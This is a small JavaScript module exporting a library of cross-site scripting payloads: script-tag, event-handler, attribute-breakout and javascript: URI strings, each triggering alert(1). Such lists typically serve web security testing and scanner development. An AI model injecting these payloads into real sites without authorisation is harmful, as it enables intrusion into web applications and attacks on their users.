/*
|--------------------------------------------------------------------------
| Cross-Site Scripting Payload Library
|--------------------------------------------------------------------------
*/

module.exports = {

  reflected: [

    "<script>alert(1)</script>",

    "\"><script>alert(1)</script>",

    "'><script>alert(1)</script>",

    "<img src=x onerror=alert(1)>",

    "<svg/onload=alert(1)>",

    "<body onload=alert(1)>"

  ],

  attribute: [

    "\" onmouseover=\"alert(1)",

    "' onmouseover='alert(1)",

    "\" autofocus onfocus=alert(1) x=\""

  ],

  javascript: [

    "javascript:alert(1)",

    "JaVaScRiPt:alert(1)"

  ]

};
